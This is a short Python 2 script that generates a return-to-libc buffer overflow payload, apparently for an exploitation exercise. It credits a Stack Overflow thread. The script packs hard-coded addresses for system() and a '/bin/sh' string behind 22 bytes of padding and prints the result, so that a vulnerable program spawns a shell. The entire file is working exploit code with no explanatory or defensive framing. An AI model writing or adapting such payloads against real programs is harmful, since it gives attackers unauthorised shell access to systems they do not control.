from struct import pack

# Thanks to https://stackoverflow.com/questions/19124095/return-to-lib-c-buffer-overflow-exercise-issue for the bin sh loading

buf_addr = pack("<I", (0xbffeb8b8 - 0x12))
bin_sh_a = pack("<I", 0x80c61e5)
system_a = pack("<I", 0x804a030)
padding = "\xAA" * (0x12 + 4)

print padding + system_a + "\xAA" * 4 + bin_sh_a
